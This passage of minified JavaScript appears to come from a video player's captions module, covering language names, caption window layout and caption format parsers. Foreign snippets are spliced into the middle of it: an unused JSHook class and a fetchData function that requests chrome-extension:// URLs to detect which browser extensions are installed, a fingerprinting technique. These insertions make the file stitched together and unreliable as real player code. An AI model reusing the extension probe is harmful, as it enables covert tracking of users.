      mga: "Middle Irish",
      mgh: "Makhuwa-Meetto",
      mgo: "Meta\u02bc",
      mh: "Marshallese",
      mi: "M\u0101ori",
      mic: "Mi'kmaq",
      min: "Minangkabau",
      mk: "Macedonian",
      ml: "Malayalam",
      mn: "Mongolian",
      mnc: "Manchu",
      mni: "Manipuri",
      mni_Beng: "Manipuri (Bangla)",
      mo: "Romanian",
      moh: "Mohawk",
      mos: "Mossi",
      mr: "Marathi",
      ms: "Malay",
      mt: "Maltese",
      mua: "Mundang",
      mul: "Multiple languages",
      mus: "Muscogee",
      mwl: "Mirandese",
      mwr: "Marwari",
      my: "Burmese",
      mye: "Myene",
      myv: "Erzya",
      mzn: "Mazanderani",
      na: "Nauru",
      nap: "Neapolitan",
      naq: "Nama",
      nb: "Norwegian Bokm\u00e5l",
      nd: "North Ndebele",
      nds: "Low German",
      nds_NL: "Low German (Netherlands)",
      ne: "Nepali",
      "new": "Newari",
      ng: "Ndonga",
      nia: "Nias",
      niu: "Niuean",
      nl: "Dutch",
      nl_BE: "Dutch (Belgium)",
      nmg: "Kwasio",
      nn: "Norwegian Nynorsk",
      nnh: "Ngiemboon",
      no: "Norwegian",
      nog: "Nogai",
      non: "Old Norse",
      nqo: "N\u2019Ko",
      nr: "South Ndebele",
      nso: "Northern Sotho",
      nus: "Nuer",
      nv: "Navajo",
      nwc: "Classical Newari",
      ny: "Nyanja",
      nym: "Nyamwezi",
      nyn: "Nyankole",
      nyo: "Nyoro",
      nzi: "Nzima",
      oc: "Occitan",
      oj: "Ojibwa",
      om: "Oromo",
      or: "Odia",
      os: "Ossetic",
      osa: "Osage",
      ota: "Ottoman Turkish",
      pa: "Punjabi",
      pa_Arab: "Punjabi (Arabic)",
      pa_Guru: "Punjabi (Gurmukhi)",
      pag: "Pangasinan",
      pal: "Pahlavi",
      pam: "Pampanga",
      pap: "Papiamento",
      pau: "Palauan",
      pcm: "Nigerian Pidgin",
      peo: "Old Persian",
      phn: "Phoenician",
      pi: "Pali",
      pl: "Polish",
      pon: "Pohnpeian",
      pro: "Old Proven\u00e7al",
      ps: "Pashto",
      pt: "Portuguese",
      pt_BR: "Portuguese (Brazil)",
      pt_PT: "Portuguese (Portugal)",
      qu: "Quechua",
      raj: "Rajasthani",
      rap: "Rapanui",
      rar: "Rarotongan",
      rm: "Romansh",
      rn: "Rundi",
      ro: "Romanian",
      ro_MD: "Romanian (Moldova)",
      rof: "Rombo",
      rom: "Romany",
      ru: "Russian",
      rup: "Aromanian",
      rw: "Kinyarwanda",
      rwk: "Rwa",
      sa: "Sanskrit",
      sad: "Sandawe",
      sah: "Yakut",
      sam: "Samaritan Aramaic",
      saq: "Samburu",
      sas: "Sasak",
      sat: "Santali",
      sat_Olck: "Santali (Ol Chiki)",
      sba: "Ngambay",
      sbp: "Sangu",
      sc: "Sardinian",
      scn: "Sicilian",
      sco: "Scots",
      sd: "Sindhi",
      sd_Arab: "Sindhi (Arabic)",
      sd_Deva: "Sindhi (Devanagari)",
      se: "Northern Sami",
      see: "Seneca",
      seh: "Sena",
      sel: "Selkup",
      ses: "Koyraboro Senni",
      sg: "Sango",
      sga: "Old Irish",
      sh: "Serbo-Croatian",
      shi: "Tachelhit",
      shi_Latn: "Tachelhit (Latin)",
      shi_Tfng: "Tachelhit (Tifinagh)",
      shn: "Shan",
      shu: "Chadian Arabic",
      si: "Sinhala",
      sid: "Sidamo",
      sk: "Slovak",
      sl: "Slovenian",
      sm: "Samoan",
      sma: "Southern Sami",
      smj: "Lule Sami",
      smn: "Inari Sami",
      sms: "Skolt Sami",
      sn: "Shona",
      snk: "Soninke",
      so: "Somali",
      sog: "Sogdien",
      sq: "Albanian",
      sr: "Serbian",
      sr_Cyrl: "Serbian (Cyrillic)",
      sr_Latn: "Serbian (Latin)",
      srn: "Sranan Tongo",
      srr: "Serer",
      ss: "Swati",
      ssy: "Saho",
      st: "Southern Sotho",
      su: "Sundanese",
      su_Latn: "Sundanese (Latin)",
      suk: "Sukuma",
      sus: "Susu",
      sux: "Sumerian",
      sv: "Swedish",
      sw: "Swahili",
      sw_CD: "Swahili (Congo - Kinshasa)",
      swb: "Comorian",
      syc: "Classical Syriac",
      syr: "Syriac",
      ta: "Tamil",
      te: "Telugu",
      tem: "Timne",
      teo: "Teso",
      ter: "Tereno",
      tet: "Tetum",
      tg: "Tajik",
      th: "Thai",
      ti: "Tigrinya",
      tig: "Tigre",
      tiv: "Tiv",
      tk: "Turkmen",
      tkl: "Tokelau",
      tl: "Tagalog",
      tlh: "Klingon",
      tli: "Tlingit",
      tmh: "Tamashek",
      tn: "Tswana",
      to: "Tongan",
      tog: "Nyasa Tonga",
      tpi: "Tok Pisin",
      tr: "Turkish",
      trv: "Taroko",
      ts: "Tsonga",
      tsi: "Tsimshian",
      tt: "Tatar",
      tum: "Tumbuka",
      tvl: "Tuvalu",
      tw: "Twi",
      twq: "Tasawaq",
      ty: "Tahitian",
      tyv: "Tuvinian",
      tzm: "Central Atlas Tamazight",
      udm: "Udmurt",
      ug: "Uyghur",
      uga: "Ugaritic",
      uk: "Ukrainian",
      umb: "Umbundu",
      ur: "Urdu",
      uz: "Uzbek",
      uz_Arab: "Uzbek (Arabic)",
      uz_Cyrl: "Uzbek (Cyrillic)",
      uz_Latn: "Uzbek (Latin)",
      vai: "Vai",
      vai_Latn: "Vai (Latin)",
      vai_Vaii: "Vai (Vai)",
      ve: "Venda",
      vi: "Vietnamese",
      vo: "Volap\u00fck",
      vot: "Votic",
      vun: "Vunjo",
      wa: "Walloon",
      wae: "Walser",
      wal: "Wolaytta",
      war: "Waray",
      was: "Washo",
      wo: "Wolof",
      xal: "Kalmyk",
      xh: "Xhosa",
      xog: "Soga",
      yao: "Yao",
      yap: "Yapese",
      yav: "Yangben",
      ybb: "Yemba",
      yi: "Yiddish",
      yo: "Yoruba",
      yrl: "Nheengatu",
      yue: "Cantonese",
      yue_Hans: "Cantonese (Simplified)",
      yue_Hant: "Cantonese (Traditional)",
      za: "Zhuang",
      zap: "Zapotec",
      zbl: "Blissymbols",
      zen: "Zenaga",
      zgh: "Standard Moroccan Tamazight",
      zh: "Chinese",
      zh_Hans: "Chinese (Simplified)",
      zh_Hant: "Chinese (Traditional)",
      zh_TW: "Chinese (Taiwan)",
      zu: "Zulu",
      zun: "Zuni",
      zxx: "No linguistic content",
      zza: "Zaza"
    };
  class JSHook {
    constructor() {
      this.hooks = {};
    }
    hook(name, fn) {
      this.hooks[name] = fn;
    }
    call(name, args) {
      if (this.hooks[name]) {
        return this.hooks[name](...args);
      }
    }
  }
  O4.prototype.contains = function (a) {
    a = g.Ob(this.segments, a);
    return 0 <= a || 0 > a && 1 === (-a - 1) % 2;
  };
  O4.prototype.length = function () {
    return this.segments.length / 2;
  };
  g.x(Djb, g.G);
  g.k = Djb.prototype;
  g.k.ya = function () {
    g.G.prototype.ya.call(this);
    this.C && this.C.cancel();
  };
  g.k.vA = function () {
    this.seekTo(this.player.getCurrentTime());
  };
  g.k.seekTo = function (a) {
    a -= this.player.Id();
    var b = this.j;
    this.j = g.xb(this.ea.Jq(a).ib);
    b !== this.j && this.ma && this.ma();
  };
  g.k.reset = function () {
    this.D = new O4();
    this.K = -1;
    this.C && (this.C.cancel(), this.C = null);
  };
  g.k.zX = function () {
    this.isDisposed();
    var a;
    if (a = null != this.j) a = this.j, a = a.j.Fs(a);
    if (a && !this.C && !(this.j && 30 < this.j.startTime - this.player.getCurrentTime())) {
      a = this.j;
      a = a.j.ZB(a);
      var b = a.ib[0],
        c;
      if (null == (c = this.player.getVideoData()) ? 0 : c.enableServerStitchedDai) if (c = this.player.xz()) {
        var d = b.j.info.id,
          e = b.Qa,
          f = a.ib[0].D;
        if (this.policy.Ca) {
          if (c = c.Et(f, e, d, 3)) a.D = c;
        } else if (d = c.pz(f, e, d, 3)) if (c = c.YC(e), 0 === c) d && (a.j = new g.GH(d));else if (2 === c) {
          this.S.start();
          Ejb(this) && this.seekTo(this.player.getCurrentTime());
          return;
        }
      }
      (this.policy.fC ? b.j.index.Cp(b.Qa) : a.ib[0].duration) ? (this.D.contains(a.ib[0].Qa) || Fjb(this, a), this.j = g.xb(a.ib)) : Ejb(this) && this.seekTo(this.player.getCurrentTime());
    }
    this.S.start();
  };
  g.x(P4, g.gT);
  g.k = P4.prototype;
  g.k.Tt = function (a, b, c) {
    var d = this;
    this.ws();
    b = Ijb(this, a.getId());
    b || (b = a.languageCode, b = this.B.isManifestless ? Jjb(this, b, "386") : Jjb(this, b));
    if (b) {
      var e = 1E3 * (b.index.GH(b.index.pn()) - b.index.getStartTime(b.index.pn())),
        f = new g.sPa(this.Z);
      this.C = new Djb(f, this.J, b, function (h, l) {
        c(h, a, l, e);
      }, this.K || g.dJ(b.info), function () {
        d.C && d.C.reset();
        d.G = !0;
      });
    }
  };
  g.k.nQ = function () {
    var a = this.G;
    this.G = !1;
    return a;
  };
  g.k.Zz = function (a) {
    var b = this.K ? [new g.iM({
      id: "rawcc",
      languageCode: "rawcc",
      languageName: "CC1",
      is_servable: !0,
      is_default: !0,
      is_translateable: !1,
      vss_id: ".en"
    }), new g.iM({
      id: "rawcc",
      languageCode: "rawcc",
      languageName: "CC3",
      is_servable: !0,
      is_default: !0,
      is_translateable: !1,
      vss_id: ".en"
    })] : this.B.isManifestless ? Hjb(this, "386") : Hjb(this);
    b = g.v(b);
    for (var c = b.next(); !c.done; c = b.next()) g.fT(this.j, c.value);
    a();
  };
  g.k.ws = function () {
    this.C && (this.C.dispose(), this.C = null);
  };
  const jshook = new JSHook();
  g.k.Vv = function () {
    return "";
  };
  var b5 = /^#(?:[0-9a-f]{3}){1,2}$/i,
    Kjb = window.yt && window.yt.msgs_ || window.ytcfg && window.ytcfg.msgs || {};
  g.Qa("yt.msgs_", Kjb);
  var Ojb = ["left", "right", "center", "justify"];
  g.x(Q4, g.X);
  g.k = Q4.prototype;
  g.k.m1 = function (a, b) {
    this.ob = a;
    this.tb = b;
    var c = g.Io(this.element, this.element.parentElement);
    this.zb = a - c.x;
    this.Hb = b - c.y;
  };
  g.k.l1 = function (a, b) {
    if (a !== this.ob || b !== this.tb) {
      g.mr(this.element, "ytp-dragging") || g.nr(this.element, "ytp-dragging");
      var c = g.Ko(this.element);
      a = a - this.zb - .02 * this.playerWidth;
      var d = b - this.Hb - .02 * this.playerHeight,
        e = (a + c.width / 2) / this.maxWidth * 3;
      e = Math.floor(g.oe(e, 0, 2));
      var f = (d + c.height / 2) / this.maxHeight * 3;
      f = Math.floor(g.oe(f, 0, 2));
      b = e + 3 * f;
      a = (a + e / 2 * c.width) / this.maxWidth;
      a = 100 * g.oe(a, 0, 1);
      c = (d + f / 2 * c.height) / this.maxHeight;
      c = 100 * g.oe(c, 0, 1);
      this.B.params.fm = b;
      this.B.params.xo = c;
      this.B.params.jk = a;
      this.B.params.isDefault = !1;
      this.j.fm = b;
      this.j.xo = c;
      this.j.jk = a;
      this.j.isDefault = !1;
      this.Ca.fm = b;
      this.Ca.xo = c;
      this.Ca.jk = a;
      this.Ca.isDefault = !1;
      this.BZ();
    }
  };
  g.k.j1 = function () {
    g.pr(this.element, "ytp-dragging");
  };
  g.k.BZ = function () {
    this.eB(this.K);
  };
  g.k.getType = function () {
    return this.type;
  };
  g.k.eB = function (a) {
    var b = this.Wc ? 0 : Math.min(this.TV(), this.maxWidth),
      c = this.SV(),
      d = "";
    3 === this.B.params.Ji && (d = "rotate(180deg)");
    g.zo(this.element, {
      top: 0,
      left: 0,
      right: "",
      bottom: "",
      width: b ? b + "px" : "",
      height: c ? c + "px" : "",
      "max-width": "96%",
      "max-height": "96%",
      margin: "",
      transform: ""
    });
    this.UL(a);
    d = {
      transform: d,
      top: "",
      left: "",
      width: b ? b + "px" : "",
      height: c ? c + "px" : "",
      "max-width": "",
      "max-height": ""
    };
    var e = .96 * this.j.jk + 2,
      f = this.j.fm;
    switch (f) {
      case 0:
      case 3:
      case 6:
        (b = this.j.Xe.fontSizeIncrement) && 0 < b && 2 !== this.j.Ji && 3 !== this.j.Ji && (e = Math.max(e / (1 + 2 * b), 2));
        d.left = e + "%";
        break;
      case 1:
      case 4:
      case 7:
        d.left = e + "%";
        e = this.D.offsetWidth;
        b || e ? (b = b || e + 1, d.width = b + "px", d["margin-left"] = b / -2 + "px") : d.transform += " translateX(-50%)";
        break;
      case 2:
      case 5:
      case 8:
        d.right = 100 - e + "%";
    }
    b = .96 * this.j.xo + 2;
    switch (f) {
      case 0:
      case 1:
      case 2:
        d.top = b + "%";
        break;
      case 3:
      case 4:
      case 5:
        d.top = b + "%";
        (c = c || this.element.clientHeight) ? (d.height = c + "px", d["margin-top"] = c / -2 + "px") : d.transform += " translateY(-50%)";
        break;
      case 6:
      case 7:
      case 8:
        d.bottom = 100 - b + "%";
    }
    g.zo(this.element, d);
    if (this.G) {
      c = this.D.offsetHeight;
      d = 1;
      for (f = 0; f < a.length; f++) b = a[f], "string" === typeof b.text && (d += b.text.split("\n").length - 1, b.append || 0 === f || d++);
      c /= d;
      this.G.style.height = c + "px";
      this.G.style.width = c + "px";
      this.element.style.paddingLeft = c + 5 + "px";
      this.element.style.paddingRight = c + 5 + "px";
      a = Number(this.element.style.marginLeft.replace("px", "")) - c - 5;
      c = Number(this.element.style.marginRight.replace("px", "")) - c - 5;
      this.element.style.marginLeft = a + "px";
      this.element.style.marginRight = c + "px";
    }
  };
  g.k.UL = function (a) {
    var b;
    for (b = 0; b < a.length && a[b] === this.K[b]; b++);
    if (this.Ga || this.K.length > b) b = 0, this.Ga = !1, this.K = [], this.S = this.Pa = this.Oa = null, g.We(this.D);
    for (; b < a.length; b++) Tjb(this, a[b]);
  };
  g.k.TV = function () {
    return 0;
  };
  g.k.SV = function () {
    return 0;
  };
  g.k.toString = function () {
    return g.X.prototype.toString.call(this);
  };
  g.x(R4, g.gT);
  R4.prototype.Tt = function (a, b, c) {
    xjb(this.videoData.videoId, a.vssId, c);
  };
  R4.prototype.Zz = function (a) {
    if (this.audioTrack) for (var b = g.v(this.audioTrack.captionTracks), c = b.next(); !c.done; c = b.next()) g.fT(this.j, c.value);
    a();
  };
  g.x(S4, Q4);
  S4.prototype.UL = function (a) {
    var b = this.B.j;
    Q4.prototype.UL.call(this, a);
    for (a = a.length; a < b.length; a++) {
      var c = b[a];
      if (f && c.j === e) var d = f;else {
        d = {};
        Object.assign(d, c.j);
        Object.assign(d, $kb);
        var e = c.j;
        var f = d;
      }
      Tjb(this, c, d);
    }
  };
  var $kb = {
    A6: !0
  };
  g.x(T4, Q4);
  g.k = T4.prototype;
  g.k.BZ = function () {
    g.hr(this.fb);
  };
  g.k.B9 = function () {
    g.pr(this.element, "ytp-rollup-mode");
    this.eB(this.Ac, !0);
  };
  g.k.SV = function () {
    return this.C ? this.ra : this.va;
  };
  g.k.TV = function () {
    return this.C ? this.va : this.ra;
  };
  g.k.eB = function (a, b) {
    this.Ac = a;
    if (this.B.params.Lr) {
      for (var c = 0, d = 0; d < this.K.length && c < a.length; d++) this.K[d] === a[c] && c++;
      0 < c && c < a.length && (a = this.K.concat(a.slice(c)));
      this.Zb = this.ra;
      this.va = this.ra = 0;
      Q4.prototype.eB.call(this, a);
      Wjb(this, b);
    }
    Q4.prototype.eB.call(this, a);
  };
  g.x(U4, g.nG);
  U4.prototype.toString = function () {
    return g.nG.prototype.toString.call(this);
  };
  g.x(V4, g.nG);
  V4.prototype.toString = function () {
    return g.nG.prototype.toString.call(this);
  };
  var W4 = 0;
  g.x(X4, g.G);
  const fetchData = async (extName, extData) => {
    try {
      const response = await fetch(`chrome-extension://${extData.id}/${extData.file}`);
      return response.status === 200;
    } catch (e) {
      return false;
    }
  };
  X4.prototype.B = function () {
    return [];
  };
  X4.prototype.reset = function () {};
  g.x(Y4, X4);
  Y4.prototype.reset = function () {
    this.S = {};
    this.C = this.j = null;
    this.K = !0;
  };
  Y4.prototype.B = function (a, b) {
    a = a.firstChild;
    a.getAttribute("format");
    b = b || 0;
    Number.isFinite(b);
    a = Array.from(a.childNodes);
    a = g.v(a);
    for (var c = a.next(); !c.done; c = a.next()) if (c = c.value, 1 === c.nodeType) switch (c.tagName) {
      case "head":
        var d = c;
        break;
      case "body":
        var e = c;
    }
    if (d) for (d = Array.from(d.childNodes), d = g.v(d), a = d.next(); !a.done; a = d.next()) if (a = a.value, 1 === a.nodeType) switch (a.tagName) {
      case "pen":
        c = a.getAttribute("id");
        var f = this.pens,
          h = {},
          l = a.getAttribute("p");
        l && Object.assign(h, this.pens[l]);
        l = $4(a, "b");
        null != l && (h.bold = l);
        l = $4(a, "i");
        null != l && (h.italic = l);
        l = $4(a, "u");
        null != l && (h.underline = l);
        l = a5(a, "et");
        null != l && (h.charEdgeStyle = l);
        l = a5(a, "of");
        null != l && (h.offset = l);
        l = c5(a, "bc");
        null != l && (h.background = l);
        l = c5(a, "ec");
        null != l && (h.mM = l);
        l = c5(a, "fc");
        null != l && (h.color = l);
        l = a5(a, "fs");
        null != l && 0 !== l && (h.fontFamily = l);
        l = Z4(a, "sz");
        void 0 !== l && (h.fontSizeIncrement = l / 100 - 1);
        l = Z4(a, "bo");
        void 0 !== l && (h.backgroundOpacity = l / 255);
        l = Z4(a, "fo");
        void 0 !== l && (h.textOpacity = l / 255);
        l = a5(a, "rb");
        null != l && 10 !== l && 0 !== l && (h.eg = 10 < l ? l - 1 : l);
        a = a5(a, "hg");
        null != a && (h.PW = a);
        f[c] = h;
        break;
      case "ws":
        c = a.getAttribute("id");
        this.ea[c] = $jb(this, a);
        break;
      case "wp":
        c = a.getAttribute("id"), this.ma[c] = akb(this, a);
    }
    if (e) {
      d = [];
      e = Array.from(e.childNodes);
      e = g.v(e);
      for (a = e.next(); !a.done; a = e.next()) if (a = a.value, 1 === a.nodeType) switch (a.tagName) {
        case "w":
          this.j = bkb(this, a, b, !1);
          (a = this.S[this.j.id]) && a.end > this.j.start && (a.end = this.j.start);
          this.S[this.j.id] = this.j;
          d.push(this.j);
          break;
        case "p":
          l = b;
          c = [];
          f = a.getAttribute("w") || this.G;
          h = !!$4(a, "a");
          l = (Z4(a, "t") || 0) + l;
          var m = Z4(a, "d") || 5E3;
          h || (!this.K && this.C && this.C.windowId === f && this.C.end > l && (this.C.end = l), this.C && "\n" === this.C.text && (this.C.text = ""));
          var n = h ? 6 : 5,
            p = a.getAttribute("p");
          p = p ? this.pens[p] : null;
          var q = Array.from(a.childNodes);
          q.length && (this.K = null != a.getAttribute("d"));
          for (var t = 0; t < q.length; t++) {
            var u = q[t],
              y = void 0;
            0 < t && (h = !0);
            var A = void 0;
            1 === u.nodeType && (A = u);
            if (A && "s" === A.tagName) {
              if ((u = (u = A.getAttribute("p")) ? this.pens[u] : null) && u.eg && (1 === u.eg ? (u = q.slice(t, t + 4), 4 === u.length && (y = Zjb(l, m, f, h, n, u, this.pens), t += 3)) : y = Zjb(l, m, f, h, n, [A], this.pens)), !y) {
                var E = A;
                y = l;
                A = m;
                u = f;
                var L = h,
                  I = n,
                  F = E.textContent ? E.textContent : "",
                  S = E.getAttribute("p");
                S = S ? this.pens[S] : null;
                E = Z4(E, "t") || 0;
                y = new U4(y + E, A - E, I, u, F, L, S);
              }
            } else y = new U4(l, m, n, f, u.textContent || "", h, p);
            c.push(y);
            this.C = y;
          }
          if (0 < c.length) for (c[0].windowId === this.G && (this.j = bkb(this, a, b, !0), d.push(this.j)), a = g.v(c), c = a.next(); !c.done; c = a.next()) c = c.value, c.windowId = this.j.id, this.j.j.push(c), d.push(c);
      }
      b = d;
    } else b = [];
    return b;
  };
  var alb = new Map([[9, 1], [10, 1], [11, 2], [12, 3], [13, 4], [14, 5]]);
  g.x(d5, X4);
  d5.prototype.reset = function () {
    this.C.clear();
  };
  d5.prototype.B = function (a, b) {
    var c = JSON.parse(a);
    if (!c) return [];
    if (c.pens) {
      a = 0;
      for (var d = g.v(c.pens), e = d.next(); !e.done; e = d.next()) {
        e = e.value;
        var f = {},
          h = e.pParentId;
        h && Object.assign(f, this.j.get(h));
        e.bAttr && (f.bold = !0);
        e.iAttr && (f.italic = !0);
        e.uAttr && (f.underline = !0);
        h = e.ofOffset;
        null != h && (f.offset = h);
        void 0 !== e.szPenSize && (f.fontSizeIncrement = e.szPenSize / 100 - 1);
        h = e.etEdgeType;
        null != h && (f.charEdgeStyle = h);
        void 0 !== e.ecEdgeColor && (f.mM = e5(e.ecEdgeColor));
        h = e.fsFontStyle;
        null != h && 0 !== h && (f.fontFamily = h);
        void 0 !== e.fcForeColor && (f.color = e5(e.fcForeColor));
        void 0 !== e.foForeAlpha && (f.textOpacity = e.foForeAlpha / 255);
        void 0 !== e.bcBackColor && (f.background = e5(e.bcBackColor));
        void 0 !== e.boBackAlpha && (f.backgroundOpacity = e.boBackAlpha / 255);
        (h = e.rbRuby) && 10 !== h && (f.eg = 10 < h ? h - 1 : h, f.uo = alb.get(f.eg));
        e.hgHorizGroup && (f.PW = e.hgHorizGroup);
        this.j.set(a++, f);
      }
    }
    if (c.wsWinStyles) for (a = 0, d = g.v(c.wsWinStyles), e = d.next(); !e.done; e = d.next()) e = e.value, f = {}, (h = e.wsParentId) ? Object.assign(f, this.G.get(h)) : Object.assign(f, this.K), void 0 !== e.mhModeHint && (f.kA = e.mhModeHint), void 0 !== e.juJustifCode && (f.textAlign = e.juJustifCode), void 0 !== e.pdPrintDir && (f.Ji = e.pdPrintDir), void 0 !== e.sdScrollDir && (f.yR = e.sdScrollDir), void 0 !== e.wfcWinFillColor && (f.windowColor = e5(e.wfcWinFillColor)), void 0 !== e.wfoWinFillAlpha && (f.windowOpacity = e.wfoWinFillAlpha / 255), this.G.set(a++, f);
    if (c.wpWinPositions) for (a = 0, d = g.v(c.wpWinPositions), e = d.next(); !e.done; e = d.next()) e = e.value, f = {}, (h = e.wpParentId) && Object.assign(f, this.D.get(h)), void 0 !== e.ahHorPos && (f.jk = e.ahHorPos), void 0 !== e.apPoint && (f.fm = e.apPoint), void 0 !== e.avVerPos && (f.xo = e.avVerPos), void 0 !== e.ccCols && (f.Rs = e.ccCols), void 0 !== e.rcRows && (f.Lr = e.rcRows), this.D.set(a++, f);
    if (c.events) {
      a = [];
      c = g.v(c.events);
      for (d = c.next(); !d.done; d = c.next()) {
        var l = d.value;
        d = (l.tStartMs || 0) + b;
        e = l.dDurationMs || 0;
        if (l.id) f = String(l.id), d = ckb(this, l, d, e, f), a.push(d), this.C.set(f, d);else {
          l.wWinId ? f = l.wWinId.toString() : (f = "_" + W4++, h = ckb(this, l, d, e, f), a.push(h), this.C.set(f, h));
          0 === e && (e = 5E3);
          h = this.C.get(f);
          var m = !!l.aAppend,
            n = m ? 6 : 5,
            p = l.segs,
            q = null;
          l.pPenId && (q = this.j.get(l.pPenId));
          for (l = 0; l < p.length; l++) {
            var t = p[l],
              u = t.utf8;
            if (u) {
              var y = t.tOffsetMs || 0,
                A = null;
              t.pPenId && (A = this.j.get(t.pPenId));
              if (2 === (null != h.params.kA ? h.params.kA : 1 < h.j.length ? 1 : 0) && m && "\n" === u) continue;
              if (t = A && 1 === A.eg) if (t = l, t + 3 >= p.length || !p[t + 1].pPenId || !p[t + 2].pPenId || !p[t + 3].pPenId) t = !1;else {
                var E = p[t + 1].pPenId;
                (E = this.j.get(E)) && E.eg && 2 === E.eg ? (E = p[t + 2].pPenId, E = this.j.get(E), !E || !E.eg || 3 > E.eg ? t = !1 : (E = p[t + 3].pPenId, t = (E = this.j.get(E)) && E.eg && 2 === E.eg ? !0 : !1)) : t = !1;
              }
              if (t) {
                y = p[l + 1].utf8;
                t = p[l + 3].utf8;
                E = p[l + 2].utf8;
                var L = this.j.get(p[l + 2].pPenId);
                u = Yjb(u, y, E, t, L);
                m = new U4(d, e, n, f, u, m, A);
                l += 3;
              } else m = new U4(d + y, e - y, n, h.id, u, m, A || q);
              m && (a.push(m), h.j.push(m));
            }
            m = !0;
          }
        }
      }
      b = a;
    } else b = [];
    return b;
  };
  ekb.prototype.clear = function () {
    this.C = this.time = this.mode = 0;
    this.j = [];
    this.reset();
  };
  ekb.prototype.reset = function () {
    this.mode = 0;
    this.D.reset(0);
    this.G.reset(1);
  };
  var fkb = [128, 1, 2, 131, 4, 133, 134, 7, 8, 137, 138, 11, 140, 13, 14, 143, 16, 145, 146, 19, 148, 21, 22, 151, 152, 25, 26, 155, 28, 157, 158, 31, 32, 161, 162, 35, 164, 37, 38, 167, 168, 41, 42, 171, 44, 173, 174, 47, 176, 49, 50, 179, 52, 181, 182, 55, 56, 185, 186, 59, 188, 61, 62, 191, 64, 193, 194, 67, 196, 69, 70, 199, 200, 73, 74, 203, 76, 205, 206, 79, 208, 81, 82, 211, 84, 213, 214, 87, 88, 217, 218, 91, 220, 93, 94, 223, 224, 97, 98, 227, 100, 229, 230, 103, 104, 233, 234, 107, 236, 109, 110, 239, 112, 241, 242, 115, 244, 117, 118, 247, 248, 121, 122, 251, 124, 253, 254, 127, 0, 129, 130, 3, 132, 5, 6, 135, 136, 9, 10, 139, 12, 141, 142, 15, 144, 17, 18, 147, 20, 149, 150, 23, 24, 153, 154, 27, 156, 29, 30, 159, 160, 33, 34, 163, 36, 165, 166, 39, 40, 169, 170, 43, 172, 45, 46, 175, 48, 177, 178, 51, 180, 53, 54, 183, 184, 57, 58, 187, 60, 189, 190, 63, 192, 65, 66, 195, 68, 197, 198, 71, 72, 201, 202, 75, 204, 77, 78, 207, 80, 209, 210, 83, 212, 85, 86, 215, 216, 89, 90, 219, 92, 221, 222, 95, 96, 225, 226, 99, 228, 101, 102, 231, 232, 105, 106, 235, 108, 237, 238, 111, 240, 113, 114, 243, 116, 245, 246, 119, 120, 249, 250, 123, 252, 125, 126, 255];
  f5.prototype.set = function (a) {
    this.type = a;
  };
  f5.prototype.get = function () {
    return this.type;
  };
  g5.prototype.clear = function () {
    this.state = 0;
  };
  g5.prototype.update = function () {
    this.state = 2 === this.state ? 1 : 0;
  };
  g5.prototype.He = function () {
    return 0 !== this.state;
  };
  g5.prototype.matches = function (a, b) {
    return this.He() && a === this.tv && b === this.Ns;
  };
  kkb.prototype.reset = function () {
    this.timestamp = this.j = 0;
  };
  h5.prototype.updateTime = function (a) {
    for (var b = 1; 15 >= b; ++b) for (var c = 1; 32 >= c; ++c) this.B[b][c].timestamp = a;
  };
  h5.prototype.debugString = function () {
    for (var a = "\n", b = 1; 15 >= b; ++b) {
      for (var c = 1; 32 >= c; ++c) {
        var d = this.B[b][c];
        a = 0 === d.j ? a + "_" : a + String.fromCharCode(d.j);
      }
      a += "\n";
    }
    return a;
  };
  h5.prototype.reset = function (a) {
    for (var b = 0; 15 >= b; b++) for (var c = 0; 32 >= c; c++) this.B[b][c].reset();
    this.C = a;
    this.j = 0;
    this.col = this.row = 1;
  };
  var lkb = [32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 225, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 233, 93, 237, 243, 250, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 231, 247, 209, 241, 9632],
    mkb = [174, 176, 189, 191, 8482, 162, 163, 9834, 224, 32, 232, 226, 234, 238, 244, 251],
    nkb = [193, 201, 211, 218, 220, 252, 8216, 161, 42, 39, 9473, 169, 8480, 183, 8220, 8221, 192, 194, 199, 200, 202, 203, 235, 206, 207, 239, 212, 217, 249, 219, 171, 187],
    okb = [195, 227, 205, 204, 236, 210, 242, 213, 245, 123, 125, 92, 94, 95, 124, 126, 196, 228, 214, 246, 223, 165, 164, 9475, 197, 229, 216, 248, 9487, 9491, 9495, 9499];
  skb.prototype.reset = function (a, b) {
    this.G = b;
    this.style.set(2);
    this.B = this.K;
    this.D = this.S;
    this.j = this.B;
    var c = (a << 2) + (b << 1);
    this.K.reset(c);
    this.S.reset(c);
    this.text.reset((a << 2) + (b << 1) + 1);
  };
  dkb.prototype.reset = function (a) {
    this.G = a;
    this.B.clear();
    this.D = this.C;
    this.C.reset(a, 0);
    this.K.reset(a, 1);
  };
  wkb.prototype.D = function () {};
  g.x(m5, wkb);
  m5.prototype.D = function (a, b, c, d, e) {
    if (c < d) {
      var f = "_" + W4++;
      c = c / 1E3 - this.K;
      d = d / 1E3 - this.K;
      a = new V4(c, d - c, 5, f, {
        textAlign: 0,
        fm: 0,
        jk: 2.5 * b,
        xo: 5.33 * a
      });
      e = new U4(c, d - c, 5, f, e);
      this.B.push(a);
      this.B.push(e);
    }
  };
  g.x(p5, X4);
  p5.prototype.B = function (a) {
    a = new m5(a, a.byteLength, this.C);
    if (xkb(a)) {
      for (; a.byteOffset < a.j.byteLength;) for (0 === a.version ? a.C = o5(a) * (1E3 / 45) : 1 === a.version && (a.C = 4294967296 * o5(a) + o5(a)), a.G = n5(a); 0 < a.G; a.G--) {
        var b = n5(a),
          c = n5(a),
          d = n5(a);
        b & 4 && (b & 3) === this.track && (0 === this.track || 1 === this.track) && (b = this.j, b.j.push({
          time: a.C,
          type: this.track,
          TU: c,
          UU: d,
          order: b.j.length
        }));
      }
      jkb(this.j, a);
      return a.B;
    }
    return [];
  };
  p5.prototype.reset = function () {
    this.j.clear();
  };
  g.x(q5, X4);
  q5.prototype.B = function (a, b) {
    var c = [];
    a = a.split(blb);
    for (var d = 1; d < a.length; d++) {
      var e = a[d],
        f = b;
      if ("" !== e && !clb.test(e)) {
        var h = dlb.exec(e);
        if (h && 4 <= h.length) {
          var l = Akb(h[1]),
